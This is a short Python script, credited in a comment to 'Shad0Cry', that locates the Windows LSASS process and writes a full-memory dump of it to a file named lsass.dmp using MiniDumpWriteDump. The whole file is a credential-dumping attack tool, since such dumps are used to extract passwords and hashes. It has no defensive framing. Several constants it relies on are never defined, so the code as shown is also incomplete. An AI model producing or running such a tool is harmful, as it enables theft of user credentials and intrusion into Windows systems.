#Code By Shad0Cry

import ctypes
import ctypes.wintypes as wintypes
import os
import psutil
import functools
import operator

# Define a custom exception class for error handling
class WindowsApiError(Exception):
    def __init__(self, error_code, message):
        self.error_code = error_code
        self.message = message
        super().__init__(f"Windows API error {error_code}: {message}")

# Define a decorator to check for Windows API errors
def check_api_error(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        if result == 0:
            error_code = kernel32.GetLastError()
            raise WindowsApiError(error_code, kernel32.FormatMessageW(error_code))
        return result
    return wrapper

# Load DLLs
dbghelp = ctypes.WinDLL("Dbghelp.dll")
kernel32 = ctypes.WinDLL("Kernel32.dll")

# Define function prototypes with error checking
OpenProcess = check_api_error(kernel32.OpenProcess)
OpenProcess.restype = wintypes.HANDLE
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

CreateFile = check_api_error(kernel32.CreateFileW)
CreateFile.restype = wintypes.HANDLE
CreateFile.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]

MiniDumpWriteDump = check_api_error(dbghelp.MiniDumpWriteDump)
MiniDumpWriteDump.restype = wintypes.BOOL
MiniDumpWriteDump.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID]

CloseHandle = check_api_error(kernel32.CloseHandle)
CloseHandle.restype = wintypes.BOOL
CloseHandle.argtypes = [wintypes.HANDLE]

# Define a class to represent a process
class Process:
    def __init__(self, pid):
        self.pid = pid
        self.handle = None

    def open(self):
        self.handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, self.pid)
        return self.handle

    def close(self):
        CloseHandle(self.handle)

# Define a class to represent a file
class File:
    def __init__(self, file_name):
        self.file_name = file_name
        self.handle = None

    def create(self):
        self.handle = CreateFile(self.file_name, 0x40000000, 0, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None)
        return self.handle

    def close(self):
        CloseHandle(self.handle)

# Find the LSASS process
lsass_pid = None
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'] == 'lsass.exe':
        lsass_pid = proc.info['pid']
        break

if lsass_pid is None:
    raise RuntimeError("Failed to find LSASS process")

# Create a process object for LSASS
lsass_process = Process(lsass_pid)

# Open the LSASS process
lsass_process.open()

# Create a file object for the dump file
dump_file = File("lsass.dmp")

# Create the dump file
dump_file.create()

# Write the minidump
MiniDumpWriteDump(lsass_process.handle, lsass_pid, dump_file.handle, MiniDumpWithFullMemory, None, None, None)

# Close the handles
lsass_process.close()
dump_file.close()